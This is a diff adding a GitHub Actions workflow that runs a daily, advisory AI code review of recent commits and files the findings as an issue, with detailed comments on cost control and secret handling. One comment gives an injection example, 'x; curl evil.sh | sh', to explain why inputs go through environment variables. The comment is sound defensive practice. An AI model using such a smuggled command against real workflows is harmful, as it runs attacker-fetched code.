@@ -1,0 +1,182 @@
+# Scheduled AI code review of recent changes.
+#
+# REQUIRED SECRET: ANTHROPIC_API_KEY
+#   Settings -> Secrets and variables -> Actions -> New repository secret.
+#   Without it this workflow SKIPS with a clear message and exits green. It
+#   never fails a build, and it never blocks a release — the review is
+#   advisory output, not a gate.
+#
+# Cost control, because this has bitten before
+# --------------------------------------------
+# A previous multi-agent review consumed 14% of the maintainer's weekly limit
+# in a single run. Every design choice here pushes the other way:
+#
+#   * It runs on CI against a repository API key. It must never be run from an
+#     interactive Claude session.
+#   * Mid-tier model by default (claude-sonnet-5). See docs for the per-run
+#     numbers; measured worst case at the size cap is well under a dollar.
+#   * ONE request per run. No multi-agent fan-out, no re-reads, no retries
+#     beyond the SDK's own.
+#   * The diff is bounded by time window AND by a hard character cap.
+#   * Daily, not weekly — measured against this repo's actual cadence (several
+#     squash-merged release PRs per day), a 7-day window is ~1.35M chars and
+#     would be truncated every single run, while a 1-day window fits.
+#   * On a day with no changes the script exits before it builds a client:
+#     zero requests, zero spend.
+#
+# It does NOT open pull requests and does NOT modify code. Output is one
+# GitHub issue when there is something to say, and a job summary always.
+#
+# PR-comment mode is implemented below (the `Comment on the pull request`
+# step) but the `pull_request:` trigger is deliberately OFF. This repo's PRs
+# are squash-merged release PRs containing the whole week's work — reviewing
+# them would duplicate what the daily runs already covered, at the size cap,
+# every time. To turn it on, add `pull_request:` under `on:` — the rest is
+# already wired.
+
+name: AI Code Review
+
+on:
+  schedule:
+    # 07:00 UTC daily. Offset from dependency-audit (06:00 Mon) and
+    # security-scan (07:00 Mon) is intentional but not load-bearing.
+    - cron: '0 7 * * *'
+  workflow_dispatch:
+    inputs:
+      since_days:
+        description: 'Review commits from the last N days'
+        required: false
+        default: '1'
+        type: string
+      base_ref:
+        description: 'Explicit base revision (overrides since_days). E.g. a tag, SHA, or merge-base.'
+        required: false
+        default: ''
+        type: string
+      model:
+        description: 'Model to review with'
+        required: false
+        default: 'claude-sonnet-5'
+        type: choice
+        options:
+          - claude-sonnet-5
+          - claude-haiku-4-5
+          - claude-opus-5
+      effort:
+        description: 'Reasoning effort'
+        required: false
+        default: 'high'
+        type: choice
+        options:
+          - low
+          - medium
+          - high
+      max_chars:
+        description: 'Hard cap on diff characters sent to the model'
+        required: false
+        default: '350000'
+        type: string
+
+permissions:
+  contents: read
+  issues: write
+  pull-requests: write
+
+concurrency:
+  group: ai-code-review-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  review:
+    name: Review recent changes
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          # The script walks back through history to find the review base, so
+          # the default single-commit checkout is not enough. 0 = full history.
+          fetch-depth: 0
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+
+      - name: Install the Anthropic SDK
+        run: pip install --disable-pip-version-check 'anthropic>=0.75,<1.0'
+
+      - name: Run the review
+        id: review
+        env:
+          # Absent secret => empty string => the script skips and exits 0.
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Every dispatch input is passed through the environment rather than
+          # interpolated into the shell text. `${{ }}` expansion happens before
+          # bash ever sees the line, so a base_ref of `x; curl evil.sh | sh`
+          # would execute as written. Only maintainers can dispatch a workflow,
+          # but a security workflow should not be the one modelling the bad
+          # habit.
+          IN_BASE_REF: ${{ inputs.base_ref }}
+          IN_SINCE_DAYS: ${{ inputs.since_days || '1' }}
+          IN_MODEL: ${{ inputs.model || 'claude-sonnet-5' }}
+          IN_EFFORT: ${{ inputs.effort || 'high' }}
+          IN_MAX_CHARS: ${{ inputs.max_chars || '350000' }}
+          EVENT_NAME: ${{ github.event_name }}
+          PR_BASE_REF: ${{ github.base_ref }}
+        run: |
+          BASE_ARG=()
+          if [ -n "$IN_BASE_REF" ]; then
+            BASE_ARG=(--base "$IN_BASE_REF")
+          elif [ "$EVENT_NAME" = "pull_request" ]; then
+            BASE_ARG=(--base "origin/$PR_BASE_REF")
+          fi
+          python scripts/ci/ai_code_review.py \
+            "${BASE_ARG[@]}" \
+            --since-days "$IN_SINCE_DAYS" \
+            --model "$IN_MODEL" \
+            --effort "$IN_EFFORT" \
+            --max-chars "$IN_MAX_CHARS" \
+            --out ai-review.md \
+            --result ai-review-result.json
+          # Three distinct outcomes, kept distinct: findings, no findings, and
+          # "the review did not run". Collapsing the third into the second
+          # would report a skipped run as a clean bill of health.
+          {
+            echo "status=$(jq -r .status ai-review-result.json)"
+            echo "findings=$(jq -r .findings ai-review-result.json)"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Open an issue with the findings
+        if: >-
+          steps.review.outputs.status == 'ok' &&
+          steps.review.outputs.findings != '0' &&
+          github.event_name != 'pull_request'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          FINDINGS: ${{ steps.review.outputs.findings }}
+        run: |
+          TITLE="AI code review — $(date -u +%Y-%m-%d) (${FINDINGS} finding(s))"
+          # The retry without --label exists because `gh issue create` fails
+          # outright when the label does not exist in the repo yet. Losing the
+          # label is fine; losing the whole report is not.
+          gh issue create --title "$TITLE" --body-file ai-review.md --label ai-code-review \
+            || gh issue create --title "$TITLE" --body-file ai-review.md
+
+      - name: Comment on the pull request
+        if: >-
+          steps.review.outputs.status == 'ok' &&
+          steps.review.outputs.findings != '0' &&
+          github.event_name == 'pull_request'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: gh pr comment "${{ github.event.pull_request.number }}" --body-file ai-review.md
+
+      - name: Upload the report
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ai-review
+          path: |
+            ai-review.md
+            ai-review-result.json
+          if-no-files-found: ignore
